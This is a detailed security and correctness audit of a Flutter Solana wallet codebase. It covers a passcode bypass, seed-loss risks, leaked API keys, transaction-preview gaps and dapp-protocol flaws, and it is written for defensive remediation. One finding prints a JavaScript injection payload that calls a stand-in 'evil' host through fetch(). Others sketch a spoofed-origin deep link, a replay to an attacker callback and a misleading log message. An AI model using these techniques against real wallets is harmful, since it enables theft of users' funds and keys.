# Codebase audit

Ten reviewers over 178 files / 33,906 lines of `lib`, plus the 23 test files.
Every finding below was verified against the source before it was written down;
claims that did not survive verification are recorded at the bottom so they are
not re-litigated.

The ordering is by damage, not by area. A wallet has one job that matters —
do not lose the user's money, do not leak their seed — so everything that
touches those two things comes first.

---

## Tier 0 — the app can be unlocked without the passcode

**`lib/core/router/app_router.dart:43`** constructs `GoRouter` with
`navigatorKey`, `initialLocation`, `onException` and `routes`. There is no
`redirect` and no `refreshListenable`. The passcode is therefore not a gate on
the app; it is one navigation decision taken once, in
`lib/shared/screens/splash/splash_screen.dart:81`.

Three ways past it, all reachable today:

1. **`lib/core/deeplink/deep_link_bridge.dart:62`** ends `_handle` with an
   unconditional `_router?.go(AppRoutes.homepage)`. `solfare` is a registered
   scheme (`ios/Runner/Info.plist`) and `AppDelegate.swift` forwards every
   incoming URL. Any other installed app, or a tapped link, sends
   `solfare://receive` and replaces the lock screen with the portfolio.
2. **`app_router.dart:48-52`** — `onException` does the same for any
   unmatched location.
3. **There is no lock on background at all.** `grep` for
   `isUnlocked|autoLock|lockTimeout` across `lib/` returns nothing. The only
   two `WidgetsBindingObserver`s in the app are the WebSocket services, and
   they use lifecycle solely to pause sockets. Unlock at 09:00, background the
   app, hand the phone over at 17:00 — it reopens on the portfolio.

Nothing downstream re-checks. `PasscodeCrypto` is referenced only by
`passcode_bloc.dart` and the two export screens; `wallet_bloc.dart:1035` reads
the stored mnemonic straight from secure storage, so `SwapBloc`, `StakingBloc`,
`WalletBloc` and `DappRequestHost` all reach `Keyring.keyPairFromMnemonic`
with no authentication.

**Fix:** an in-memory `unlocked` flag set only on `PasscodeVerified`; a
`redirect` that bounces every route except the unlock and onboarding chains
back to unlock while a passcode exists and the flag is false; a
`refreshListenable` so it re-evaluates; `DeepLinkBridge._handle` stashing the
intent and routing to unlock rather than home when locked; and an
`AppLifecycleListener` that clears the flag on `paused`.

---

## Tier 1 — the seed can be destroyed or exposed

### 1.1 Android wipes the seed on any storage error

`lib/core/security/secure_store.dart:17` passes `iOptions` and no `aOptions`.
Verified against the resolved dependency: `flutter_secure_storage-10.0.0`,
`lib/options/android_options.dart:51` — `bool resetOnError = true`. (Its own
doc comment says "Defaults to false"; the comment is wrong, the code is what
ships.) Native side, `handleStorageError` calls `deleteAll()` when the flag is
set.

A KeyStore key invalidation — OS upgrade, OEM lock-screen change, a
backup/restore — makes one read throw, the plugin deletes every entry, and the
seed is gone. The app never showed it to the user after onboarding.

**Fix:** `aOptions: const AndroidOptions(resetOnError: false)`.

### 1.2 "I could not read the wallet" is reported as "there is no wallet"

Four layers each degrade unknown into none, and not one of them logs:

- `wallet_accounts_store.dart:35` — `catch (_) { return const []; }`
- `wallet_local_datasource.dart:131` — `catch (_) { return false; }`
- `wallet_bloc.dart:552` — captures `e`, discards it, emits `WalletExistsChecked(false)`
- `splash_screen.dart:85` — routes that to onboarding

The user is then invited to create a wallet. Every mutator does an unguarded
read-modify-write (`wallet_local_datasource.dart:194`, `:214`), so
`saveAll([...[], newAccount])` overwrites the still-intact ciphertext. One
transient Keychain glitch, and the seed is permanently gone.

**Fix:** a distinct `CorruptWalletStoreException` from the decode catch,
propagated rather than flattened, and a refusal to `saveAll` when the
preceding `loadAll` failed to decode.

### 1.3 The onboarding seed screen copies with the raw clipboard

`create_wallet_screen.dart:258` — `Clipboard.setData(ClipboardData(text: wallet.mnemonic))`.
`SecureClipboard` exists and auto-clears after 30s;
`export_recovery_screen.dart:221` uses it. The one screen that shows a
brand-new seed does not. The 12 words sit in the system clipboard
indefinitely, readable by any foreground app or IME, and on iOS they cross to
the user's Mac over Universal Clipboard.

### 1.4 Screenshot protection has a hole and a gap

`SecureScreen` is a global flag with no refcount.
`create_wallet_screen.dart:299` pushes the confirm screen **on top of** the
screen still rendering the 12 words; backing out fires
`confirm_recovery_phrase_screen.dart:48` → `SecureScreen.disable()`, and the
seed behind it becomes screenshot-able. Separately,
`import_wallet_screen.dart` — a `TextField` the user types their seed into —
never calls `enable()` at all.

### 1.5 The passcode gates a boolean, not the key

`passcode_crypto.dart:36` derives 32 PBKDF2 bytes and stores them as a
comparison digest. Nothing encrypts `WalletAccount.mnemonic`;
`wallet_accounts_store.dart:42` writes `jsonEncode` of the raw object. Anyone
who can read the keychain gets the seed without the passcode, and the 100k
iterations buy nothing. The two reveal screens also load and render the secret
*before* the check (`export_recovery_screen.dart:37`), inside an
`ImageFiltered` blur — a real `Text` with the real string in the semantics
tree, readable by an accessibility service.

### 1.6 The lockout does not escalate, and two screens skip it

`passcode_bloc.dart:128` writes `attempts = '0'` when locking, so the rate
limit is a permanent 3-per-30s. Both export screens
(`export_private_key_screen.dart:130`, `export_recovery_screen.dart:86`) call
`PasscodeCrypto.verify` directly and never touch the counter — unlimited
guesses on the two screens that reveal the seed and the private key.

### 1.7 The Helius API key ships in the bundle

`.env` holds a live `HELIUS_API_KEY` and `pubspec.yaml:62` lists `.env` as a
Flutter asset. `.gitignore` keeps it out of git, which is correct and also
irrelevant: assets are plain files inside the IPA. Verified present at
`build/ios/Debug-iphonesimulator/Runner.app/Frameworks/App.framework/flutter_assets/.env`.
Every user's copy carries it. Rotate it, then inject per-build or proxy.

Same class: `jupiter_datasource.dart:8` hardcodes a live Jupiter API key in
source.

---

## Tier 2 — money moves wrongly

### 2.1 A Solana Pay SPL request is paid in native SOL

`send_sol_screen.dart:325-334`. The QR handler destructures a
`PayTransferRequest` and reads only `recipient` and `amount`. `splToken`,
`references` and `memo` are dropped. The screen's asset comes solely from
`widget.token`, which is null on the Home → Send path, so `_executeSend`
fires `SendSolEvent`.

Scan a merchant QR for 25 USDC → the sheet says "25 SOL" → 25 SOL lands at a
merchant expecting $25. It is a valid transfer to a live wallet. Nothing
fails, nothing is recoverable. The bloc already has the correct path
(`ResolvePayEvent` → `_payResolver.buildTransfer`); this screen bypasses it.

### 2.2 A client-side timeout is reported as "nothing happened"

`transaction_service.dart:417` — `_confirm` falls out of its `while` loop and
returns `TxStatus.expired` without ever checking whether the blockhash is
still valid. `staking_bloc.dart:163` renders that as *"Nothing was staked and
no fee was charged — try again"*, and `wallet_state.dart:232` documents it the
same way. On a slow cluster the transaction is still live. The user retries;
both land.

Two neighbours make it worse. `transaction_service.dart:153` only breaks the
retry loop when the deadline has *already* passed, so attempt 2 can be
broadcast with three seconds left and then declared expired while live. And
`_safeStatus` (`:553`) returns `null` on any exception — its own comment says
a flaky read must not be mistaken for a dropped transaction, and `:408` does
exactly that, then sends a second transaction.

### 2.3 Max is unsendable, on both the send and stake screens

- `send_sol_screen.dart:164` — `_setPercentage(1.0)` sets the amount to the
  full balance with no fee reserve, and validation allows `<= _balance`. Every
  Max send of native SOL fails on fee. `SwapLimits.solFeeReserve` exists; the
  send path never uses it.
- `stake_sol_screen.dart:115` — same, except `staking_bloc.dart:127` also
  funds the stake account's rent exemption (~0.00228 SOL) on top. Anything
  within ~0.0023 SOL of the balance fails, and
  `confirm_stake_sheet.dart:114` hardcodes a network fee that omits the rent
  deposit entirely, so the user approves a debit ~100× larger than stated.

### 2.4 Lamport conversion drifted because there is no constant

There is no `LAMPORTS_PER_SOL` anywhere; the literal `1000000000` appears at
17 sites. `wallet_bloc.dart:1041` carries an explicit comment —

> `round(), not toInt(): 0.29 * 1e9 is 289999999.99999994 in binary floating
> point, and truncating under-sends a lamport.`

— and `staking_bloc.dart:112` does the identical conversion with `.toInt()`,
three files away. The fix never propagated because there was nowhere for it to
propagate to.

**Correction, found while fixing this.** That comment's example is wrong:
`0.29 * 1e9` is exactly `290000000.0` in Dart, measured. The *rule* is right
— `0.000065 * 1e9` really is `64999.99999999999`, so `toInt()` under-sends —
but every divergence sits below a millionth of a SOL, so the staking
truncation was a genuine defect with an invented justification. Worth
recording as its own lesson: a comment asserting a specific number is a claim
that has to be checked like any other.

### 2.5 The swap quotes one amount and executes another

- `swap_bloc.dart:92` quotes with `.toInt()` (truncate) while `:221` executes
  with `.round()`. For 8.7 USDC that is 8699999 vs 8700000.
- `swap_bloc.dart:80` captures `final s = state` before the await and emits
  `s.copyWith(...)` after. Bloc 8's default transformer is **concurrent**, and
  a quote fires on every keystroke, so the last response to *return* wins, not
  the last keystroke. Type `12`, backspace to `1`: the field reads `1`, the
  state says `12`, and `_onExecuteSwap:208` prepares a 12 SOL swap.
- `swap_state.dart:63` — `copyWith` uses `x ?? this.x`, so passing `null` to
  clear is a no-op. Change the output token after a quote and the old
  `outputAmount` survives: the review sheet headlines "1 SOL → 150.0000 BONK"
  for a route that pays ~5,400,000 BONK.
- `swap_executor.dart:125` records `outAmountRaw` and nothing ever compares it
  to the quote the user approved. No quote-age tracking exists.

### 2.6 Every "View on Explorer" link points at devnet

Six string literals ending `?cluster=devnet`, while `NetworkConstants`
defaults to mainnet: `send_status_sheet.dart:115`,
`transaction_detail_sheet.dart:208`, `transaction_history_screen.dart:492`
and `:524`, `stake_status_sheet.dart:87`,
`stake_account_detail_screen.dart:94`. A mainnet user sends, taps Explorer,
and is told the signature does not exist — the strongest possible signal that
their money vanished.

### 2.7 A confirmed send is reported as failed

`send_sol_screen.dart:239` has an unfiltered `BlocListener` on `WalletError`,
which is emitted by handlers that have nothing to do with sending —
`_onFetchBalance` and `_onFetchTransactions`, both of which `_onSendSol`
dispatches itself right after success. Send confirms, the follow-up balance
fetch 429s, and the success sheet is replaced by a red "Failed".

### 2.8 A u64 transfer fee overflows into a negative number

`mint_info.dart:13` — `amount * basisPoints` in signed 64-bit. Verified: 1e16
base units at 1000 bps returns **-844,674,407,370,954**, and `netOf` returns
*more* than the amount sent. The `maximumFee` clamp does not catch it because
the value is negative. `wallet_bloc.dart:981` renders this straight into the
send preview.

### 2.9 The RAY mint is not a valid address

`jupiter_datasource.dart:141` — `'RaydiumPoolv4111111111111111111111111111111'`.
That is not a mint and is not even base58 (`l` is not in the alphabet).
Selecting RAY produces "Failed to get quote" forever.

### 2.10 The default validator is a devnet vote account

`stake_sol_screen.dart:33` preselects `vgcDar2pry…`, labelled "Devnet
Validator 1", with a fabricated 38.7M SOL stake, while the app defaults to
mainnet. Fresh install → Stake → every attempt fails until the user happens to
open Edit.

---

## Tier 3 — the approval sheet under-reports danger

This is the subsystem that answers "what am I about to sign?", so a gap here
is a gap in consent.

### 3.1 Every v0 transaction with a lookup table decodes to zero instructions

`preview_engine.dart:92` calls `tx.decompileMessage()`, whose
`addressLookupTableAccounts` parameter defaults to `const []`. Verified in
`solana-0.32.0/lib/src/encoder/message/decompile_v0.dart:103-109`: a non-null
empty list takes the resolve branch, which throws the moment
`addressTableLookups` is non-empty. The catch swallows it and `instructions`
stays empty.

v0 with ALTs is the *norm* — every Jupiter route, every modern dapp. So for
those transactions every instruction-level risk rule is disabled. An
`Approve(delegate = attacker, amount = u64::MAX)` moves no balances either, so
the deltas are empty too: the sheet renders one orange "instructions could not
be read" banner, a 0.000005 SOL fee, and a yellow "Slide to approve".

The resolved addresses are already in hand — `sim['loadedAddresses']` is read
at `:161`. Until the decode uses them, `instructionsUnavailable` must be
`danger`, not `caution`.

### 3.2 Decoded instructions are never shown to the user

`tx_preview.dart:188` — `visibleInstructions` has zero call sites.
`TxPreviewBody` renders banners, flags, own-account deltas and the fee, and
nothing else. So an instruction reaches the user only if a risk rule fires on
it *or* it moves a balance on the wallet's own address.

`Stake::Withdraw` draining a stake account to an attacker decodes correctly
— `'Withdraw 250 SOL from staking'` — matches no rule, and touches no account
equal to the wallet address. The sheet shows the fee and nothing else.

### 3.3 An unrecognised *instruction* on a recognised program flags nothing

`risk_engine.dart:129` gates the unknown-program caution on
`!ix.isKnownProgram`, i.e. on the program, not the instruction. The decoders'
default branches return `kind: unknownKind` while keeping `programName`
non-null, and no case matches `'unknown'`.

`System::AssignWithSeed` (tag 10) hands an account to an attacker program and
produces no flag, while `Assign` (tag 1) is correctly `danger`. Same bypass
for `Stake::AuthorizeWithSeed`/`AuthorizeChecked`/`AuthorizeCheckedWithSeed`
around the `authorizeStake` rule, and for every Token-2022 extension
instruction.

### 3.4 Only exactly `u64::MAX` counts as an unlimited approval

`instruction_decoder.dart:181` compares by string equality.
`amount = u64::MAX - 1` — about 1.8e13 USDC — renders as "Grant spending of a
token" at `caution`, so the slider stays yellow. The flag detail is a constant
string: no amount, no delegate, no mint. An approval of 0.01 USDC and an
approval of everything render identically.

### 3.5 Token-2022 permanent delegate and transfer hook are parsed and discarded

`mint_info.dart:93` computes `hasPermanentDelegate`, `hasTransferHook`,
`defaultFrozen` and `interestBearing`. None has a reader anywhere in `lib/`.
A mint whose authority can move the user's entire balance at will, forever,
produces no warning. `mint_info_test.dart` has 17 assertions covering a
warning that does not exist.

### 3.6 The previewed fee is not the fee that gets paid

`preview_engine.dart:50` simulates the bare instructions.
`TransactionService` prepends `setComputeUnitLimit` + `setComputeUnitPrice`,
and the oracle bids up to 5,000,000 µlamports. During congestion the sheet
shows 0.000005 SOL for a transaction that pays up to 0.005005 SOL.

### 3.7 Attacker-controlled strings are rendered as the wallet's own voice

- `preview_engine.dart:281` takes text after `Error:` from a program log and
  `tx_preview_body.dart:52` renders it unbounded, unescaped. A program that
  fails only under simulation can log
  `Error: preview unavailable on this RPC, this is expected — approve to continue`,
  and the red banner reads as reassurance.
- `confirm_send_sheet.dart:134` headlines `SplToken.symbol`, taken from
  Metaplex metadata with no length cap and no bidi filtering, above an
  `Image.network` of an attacker-supplied URL (which also leaks the user's IP
  and the approval timing). A scam mint declaring `symbol: "SOL"` and the
  Solana logo renders as a SOL transfer.
- `token_detail_screen.dart:1052` interpolates the same untrusted symbol
  **unescaped into JavaScript** in a `JavaScriptMode.unrestricted` WebView.
  A symbol of `X') ;fetch('https://evil/'+…);//` executes. The
  `NavigationDelegate` blocks navigations, not `fetch`.

---

## Tier 4 — the dapp surface

### 4.1 A dapp picks its own origin

`dapp_request.dart:113` — the identity shown to the user is `app_url`, a query
parameter the caller supplies, checked only for `scheme == 'https'`. Nothing
binds it to `dapp_encryption_public_key`, and there is no
Universal-Links/`.well-known` association anywhere in the repo. Any app can
open `solfare://v1/connect?app_url=https%3A%2F%2Fjup.ag&…`; the sheet reads
"Requested by jup.ag" and that string is persisted as `DappSession.origin`,
which is the only identity shown on every later signing request.

`dapp_session.dart:16` asserts the opposite property in a comment — *"a dapp
picks its own name, it does not pick its domain"*. Over a custom scheme it
picks both. (The `ConnectedAppsScreen` I wrote inherits this: it is showing an
unverified claim as though it were an origin.)

### 4.2 A signed transaction can be replayed to a different callback

`dapp_connect_service.dart:104` — no seen-nonce store exists anywhere, and the
reply destination is read from `request.redirectLink` per request rather than
from the session, which has no redirect field. Capture one sealed deeplink,
resend it with `redirect_link` swapped to an attacker callback: it decrypts
(same key, same nonce, same ciphertext), the sheet shows the legitimate origin
and the legitimate preview, and the signed transaction is delivered to the
attacker.

### 4.3 Disconnect is unauthenticated

`dapp_request.dart:71` — `DappDisconnectRequest` is not a `DappSealedRequest`.
It carries no ciphertext, so nothing proves the sender holds the dapp private
key, and `dapp_request_host.dart:81` approves it with no sheet. Any app that
knows a dapp's public key can silently revoke the session.

### 4.4 The error codes enumerate the user's connections

`dapp_connect_service.dart:93` returns `4100` for "no session" and `4200` for
"session exists but the payload did not decrypt". Send garbage for each
candidate dapp key and read the code to learn exactly which dapps this wallet
is connected to. `dapp_session.dart:127` documents the intent to avoid this.

### 4.5 Approve is offered when the transaction was never checked

Both sheets gate the primary action on `preview.hasDanger`, and
`TxPreview.unverified` carries no flags at all. When the RPC cannot simulate,
the button is the ordinary yellow "Approve", visually identical to a fully
verified safe transaction — and for `signTransaction` the wallet then hands
the dapp a signature over a payload it never inspected.

### 4.6 Session timestamps are local-time with no offset

`dapp_session.dart:66` — `DateTime.now().toIso8601String()` on a local
`DateTime` emits no offset and parses back as local. A session written in
UTC+2 and read in UTC−7 shifts nine hours. Setting the clock back makes every
session immortal. There is also no absolute cap from `createdAt`, so a dapp
that pings monthly holds its session forever.

### 4.7 The dapp browser shows the page's own title as its identity

`dapp_browser_screen.dart:147` renders `_pageTitle` in place of the host, so
`evil.com` serving `<title>jup.ag</title>` owns the only origin indicator.
`_displayUrl` also drops the scheme entirely and `replaceFirst('www.','')`
rewrites the host anywhere it appears — `paypal.com.www.evil.com` renders as
`paypal.com.evil.com`. The `NavigationDelegate` implements no
`onNavigationRequest`, so `file://`, `about:` and `intent://` are all
reachable.

---

## Tier 5 — wrong numbers on screen

- **`token_detail_screen.dart:402`** — a private `_formatPrice` duplicating
  `MarketFormat.price` but stopping at 6 decimals. The market row shows
  `$0.0₃788`; tapping through shows `$0.000788`. The chart tooltip
  (`:957`) is `toStringAsFixed(2)`, i.e. `$0.00` for every point on any
  sub-cent token.
- **`token_detail_screen.dart:1052`** — the candlestick chart is fetched by
  ticker symbol, so a mint whose ticker is `BTC` renders Bitcoin's real
  candles under its name and logo.
- **`token_detail_screen.dart:972`** — the crosshair stores an index into the
  down-sampled list and divides by the unsampled length. On the default 1D
  timeframe the right-hand edge labels "now" as ~16 hours ago.
- **`market_format.dart:48`** — `compact(999999)` → `$1000K`;
  `compact(999999999)` → `$1000M`.
- **`market_bloc.dart:44`** — the cache-hit path does not bump `_loadId`, so a
  slow request from the previous window still passes the staleness check and
  overwrites the current one.
- **`market_bloc.dart:112`** — `_ordered` sorts the already-sorted list and
  the bloc keeps no copy of the feed order, so `MarketSort.rank` can never
  restore it.
- **`solana_rpc_datasource.dart:202`** — history amount is
  `preBalances[0] - postBalances[0] - fee`, which is only meaningful for a
  bare SOL transfer. Every SPL transfer renders as "0 SOL", and
  `receiver = accountKeys[1]` is the *source* token account. Sending 50 USDC
  produces a row reading "Sent −0 SOL" to an address the user never sent to.
- **`staking_bloc.dart:62`** — `_determineState` has no branch returning
  `'active'`, so a stake active for months reports "activating" forever, and
  a cooled-down account reports "deactivating" forever. `ValidatorInfo.apyPercent`
  is never populated, so the staking screen always advertises `~0.00% APY`.
- **`swap_screen.dart:158`** — the red "Insufficient" banner is bound to
  *having a quote*, not to the balance check, so it renders above an enabled
  Review button on a fully funded wallet. `:309` and `:381` hardcode
  `'Max: 0'` and `'Balance: 0'` while `state.inputBalance` sits in state.
- **`transaction_history_screen.dart:382`** — `toStringAsFixed(0 or 2)`, so
  every sub-cent-of-a-SOL transfer renders `0.00`.

---

## Tier 6 — structural

### 6.1 The lint config is one line, and nothing runs the analyzer

`analysis_options.yaml` is `include: package:flutter_lints/flutter.yaml`.
`flutter analyze` reports **29 issues** today — 13 of them
`use_build_context_synchronously` — and there is no CI config in the repo, so
none of them has ever blocked a commit.

Rules that would each have caught something above:

| Rule | Hits | Catches |
|---|---|---|
| `avoid_dynamic_calls` | 84 | A wallet parsing untrusted on-chain JSON through `dynamic`; 60 hits in `solana_rpc_datasource.dart` alone. Every one is a `NoSuchMethodError` that then gets swallowed into `return []`. |
| `only_throw_errors` | 16 | `Failure` extends neither `Exception` nor `Error`, and is caught by type nowhere. |
| `unawaited_futures` | 23 | `WidgetBridge.pushPrice`, `launchUrl`, `setLocale` — failures nobody can observe. |
| `use_build_context_synchronously` → `error` | 13 | Already on, blocks nothing. Most need `context.mounted`, not `State.mounted`. |
| `avoid_void_async` | 4 | `stake_account_detail_screen.dart:93`, whose `catch (_) {}` eats the launch failure. |

### 6.2 There is no theme

`lib/core/theme/` exists and is empty. `MaterialApp.router` passes no `theme:`
at all. The result: **195 `Color(0x…)` literals, 148 distinct**, plus 999
`Colors.*` references; **498 inline `TextStyle`s, 459 of which repeat
`fontFamily: 'FKGrotesk'` by hand**; 14 distinct corner radii; three different
Scaffold backgrounds.

Semantic colours have already forked — seven reds for "error", seven greens
for "positive". Visibly, inside one file: `token_detail_screen.dart:40`
declares `_up = 0xFF7BD64B` for the line chart while the candlestick chart in
the same file uses `#4CAF50`, so toggling the chart type changes the green.

### 6.3 Address shortening is implemented 18 times

And has drifted on three axes: `…` (8 sites) vs `...` (10), 4/4 vs 6/6
head/tail, and three different guard thresholds. The same address renders
`7xKX…gAsU` on the dapp approval sheet and `7xKX...gAsU` on the receive
screen.

Also duplicated: the WebSocket `_scheduleReconnect` (near-verbatim between two
files), the mini-keypad on both key-export screens (byte-identical), number
formatters (four copies, two named `_formatStake` that already disagree),
time-ago (three), bottom-sheet scaffolding (24 sites, three body colours, two
handle greys), confirm dialogs (six).

### 6.4 17 buttons do nothing

Six of the nine rows on Security & Privacy, including **"Change passcode"**
(the modes already exist in `passcode_screen.dart`) and a Magic AI toggle
hardwired to `value: false, onChanged: (_) {}`. Plus the homepage's Swap
action button, four `portfolio_content` CTAs, and Settings' Notifications and
Support.

The codebase already knows: `token_detail_screen.dart:236` carries the comment
*"A greyed-out control with no explanation is the same dead end the Deposit,
Swap and Limit buttons used to be."* Market was fixed; homepage and settings
were not.

Relatedly, `app_en.arb` defines 172 keys and **91 are referenced nowhere** —
53%, translated into four languages. Many are exactly the dead buttons'
labels. Meanwhile only 6 of 137 feature files call `AppLocalizations` at all,
against ~90 hardcoded English `Text('…')` literals in screens. The l10n system
exists and is bypassed.

Dead files: `promo_banner.dart`, `import_wallet.dart` (the use case; the other
two siblings are wired in), and `swap/domain/entities/swap_quote.dart` — which
also **collides by name** with the live `SwapQuote` in `swap_executor.dart:12`.

### 6.5 Lifecycle leaks

Six undisposed controllers across four files: `token_selector_sheet.dart:19`
and `address_book_screen.dart:13` (neither file has a `dispose()` at all),
`address_book_screen.dart:52-53`, `explore_screen.dart:281`,
`dapp_browser_screen.dart:268`, `send_sol_screen.dart:847`.

Everything else is clean and deliberately so — both WS services, `WalletBloc`
and `MarketHomeBloc` all cancel correctly.

Futures created in `build()`: `balance_card.dart:65`
(`getApplicationDocumentsDirectory` re-fires on every rebuild, so a custom
card background flashes grey on every balance push), `edit_background_screen.dart:156`
and `:351`, and `token_detail_screen.dart:1074`, where a `WebViewController`
is constructed and `loadHtmlString`-ed from `build`. The codebase documents
that last one at `:376` and worked around the symptom by suppressing the live
price tick.

`homepage_screen.dart:391` issues a SharedPreferences read-modify-write from
inside a `BlocConsumer` *builder*, and `portfolio_history.dart:41` is
unsynchronized, so overlapping records silently drop each other's snapshots.

---

## Tier 7 — what the 242 tests are worth

**Four tests cannot fail.** All in `brand_palette_test.dart`, all the same
shape — the assertion is inside `if (brand != null)` and the input never
survives the floors:

- `:121` "a dark brand colour is lifted enough to read on black" — `0xFF14233F`
  has lightness 0.163, below `minLightness = 0.18`. `readableLightness` has
  **zero** coverage; delete the `math.max` at `brand_palette.dart:108` and the
  suite stays green.
- `:130` "saturation is never invented" — `0xFFBEB6BA` has saturation 0.058,
  below `minSaturation = 0.25`. The regression the comment describes is
  untested.
- `:108` "transparent pixels are not black" — passes with or without the alpha
  check.
- `:164` `returnsNormally` on a 1×1 image — remove the `math.max(1, …)` guard
  it protects and the test **hangs** rather than failing.

`dapp_session_test.dart:166` is a tautology: `isExpiredAt` where
`lastUsedAt == now` is `0 > maxIdle`.

**`keyring_test.dart` (all six tests) pins no known address.** Change
`SolanaPath.defaultPath` and every test still passes — determinism holds,
lengths hold, and `keyPairFromMnemonic` vs `publicKeyFor` still agree because
both call the same private helper. Every existing user's wallet would become a
different, empty address. No test signs anything either, so the comment at
`keyring.dart:18` ("do NOT zero `priv`") is the only thing defending an
invariant that, if broken, breaks every signature in the app.

**Tests for dead code:** `swap_limits_test.dart` covers `maxSpendable`, which
has no caller. `transaction_service_test.dart:127` celebrates a multi-slot
signing branch that both production callers gate out — and the guards that
make it dead have no test.

**Zero tests exist for:** `DappConnectService` (294 lines — the whole signing
protocol), `PreviewEngine` (292 lines), `PriorityFeeOracle`, `PasscodeBloc`
lockout, `PayResolver._assertSafeToSign`, `SwapExecutor`, and the
`sendAndConfirm` path itself beyond its empty-signers guard.

**Broken fakes:** `recipient_check_test.dart:26` always builds `data` as a
`Map`, but `getAccountInfo` requests `jsonParsed`, which returns a **List**
whenever the owning program has no parser — the one shape that breaks
production is unrepresentable in the test.
`connected_apps_screen_test.dart:17` returns sessions unfiltered where the
real store prunes expired ones, so "an expired session must not be listed"
cannot be written. `transaction_service_test.dart:34` returns the same status
on every call, so the polling loop is never exercised across iterations and
`_humanizeSendFailure` has zero coverage.

---

## Verified as correct

Recorded so they are not "fixed" later:

- Entropy is sound everywhere it matters: `Random.secure()` via
  `TweetNaCl.randombytes`, per-hash unique salts, constant-time comparison on
  both passcode paths. No nonce reuse.
- No seed, key or passcode reaches `print`/`debugPrint`/`log`.
  `WalletModel.toStorageMap()` correctly excludes the mnemonic. iCloud
  Keychain sync is genuinely off.
- Solana Pay `link=` **is** https-only at parse; the exposure is redirects
  only.
- The Pay execute path reuses the cached payload and never re-POSTs, so there
  is no preview/sign TOCTOU there. `DappConnectService.approve` re-derives
  from the same bytes `prepare` previewed. The swap path previews and sends
  the same `signedTransaction`.
- `PreviewEngine`'s `delta += fee` fee-payer correction and its
  static → ALT-writable → ALT-readonly key ordering are both right, verified
  against a live mainnet `simulateTransaction`.
- `worstSeverity` uses max, not a sum, so a danger cannot hide behind benign
  instructions.
- `simulateTransaction` correctly sends `sigVerify: false` and
  `replaceRecentBlockhash: true`.
- `MarketFormat`'s sort comparator is a valid total order, copies before
  sorting, and deliberately avoids `List.sort` for `rank` to survive its
  instability. Every numeric read in the market data layer goes through
  `as num?`.
- `HttpRetry` is correct on every point checked: 12s per attempt, exponential
  backoff with jitter, 4xx other than 429 returned immediately.
- Every `BuildContext` use after an `await` in the market feature is properly
  guarded.
- Dependency hygiene is clean — no declared-but-unused, no
  imported-but-transitive. `pinenacl` and the `photo_manager` pin both carry
  correct explanations.
- Zero `TODO`/`FIXME`/`HACK` in `lib/` or `test/`. Two commented-out lines
  total.

---

## Order of attack

1. **The lock bypass** (Tier 0) — everything else assumes an attacker does not
   already have the app open.
2. **`resetOnError: false`** (1.1) — one line, prevents total seed loss.
3. **The Solana Pay SPL bug** (2.1) and **the expired-vs-landed confusion**
   (2.2) — the two ways the app currently loses money on a normal path.
4. **The six devnet URLs** (2.6), **`staking_bloc.dart:112`** (2.4), **the RAY
   mint** (2.9), **the devnet validator** (2.10) — an hour's work, all
   user-visible.
5. **ALT decoding** (3.1) — until it is fixed, `instructionsUnavailable` must
   read as `danger`.
6. **Rotate both API keys** (1.7), then unbundle `.env`.
7. `analysis_options.yaml` + a CI `dart analyze --fatal-infos` job, so the
   next 29 issues cannot accumulate silently.
8. The theme (6.2) and the shared helpers (6.3) — these are what stop the
   drift in 2.4, 2.6 and 6.3 from recurring.
9. Replace the four tests that cannot fail; add a golden derivation vector to
   `keyring_test.dart`.
